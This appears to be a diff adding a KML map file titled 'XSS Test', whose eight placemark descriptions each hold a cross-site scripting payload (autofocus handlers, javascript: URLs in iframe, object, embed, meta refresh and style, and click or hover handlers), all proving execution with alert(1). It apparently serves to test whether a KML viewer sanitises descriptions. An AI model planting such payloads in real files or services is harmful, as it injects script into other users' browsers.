@@ -1,0 +1,78 @@
+<kml xmlns="http://www.opengis.net/kml/2.2" xmlns:gx="http://www.google.com/kml/ext/2.2" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.opengis.net/kml/2.2 https://developers.google.com/kml/schema/kml22gx.xsd">
+  <Document>
+    <name>XSS Test</name>
+
+    <!-- 1. onfocus + autofocus (automático) -->
+    <Placemark>
+      <name>XSS - autofocus</name>
+      <description><![CDATA[<input autofocus onfocus="alert(1)">]]></description>
+      <Point>
+        <coordinates>8.330653965921906,46.529863580494734</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- 2. iframe src (automático) -->
+    <Placemark>
+      <name>XSS - iframe</name>
+      <description><![CDATA[<iframe src="javascript:alert(1)"></iframe>]]></description>
+      <Point>
+        <coordinates>8.5,46.5</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- 3. object data (automático) -->
+    <Placemark>
+      <name>XSS - object</name>
+      <description><![CDATA[<object data="javascript:alert(1)"></object>]]></description>
+      <Point>
+        <coordinates>8.6,46.4</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- 4. embed src (automático) -->
+    <Placemark>
+      <name>XSS - embed</name>
+      <description><![CDATA[<embed src="javascript:alert(1)">]]></description>
+      <Point>
+        <coordinates>8.7,46.3</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- 5. meta refresh (automático) -->
+    <Placemark>
+      <name>XSS - meta</name>
+      <description><![CDATA[<meta http-equiv="refresh" content="0;url=javascript:alert(1)">]]></description>
+      <Point>
+        <coordinates>8.8,46.2</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- 6. style background (automático) -->
+    <Placemark>
+      <name>XSS - style</name>
+      <description><![CDATA[<style>body{background:url('javascript:alert(1)')}</style>]]></description>
+      <Point>
+        <coordinates>8.9,46.1</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- 7. onclick (requiere clic) -->
+    <Placemark>
+      <name>XSS - onclick</name>
+      <description><![CDATA[<a href="#" onclick="alert(1)">Click me</a>]]></description>
+      <Point>
+        <coordinates>9.0,46.0</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- 8. onmouseover (requiere hover) -->
+    <Placemark>
+      <name>XSS - onmouseover</name>
+      <description><![CDATA[<a href="#" onmouseover="alert(1)">Hover me</a>]]></description>
+      <Point>
+        <coordinates>9.1,45.9</coordinates>
+      </Point>
+    </Placemark>
+
+  </Document>
+</kml>
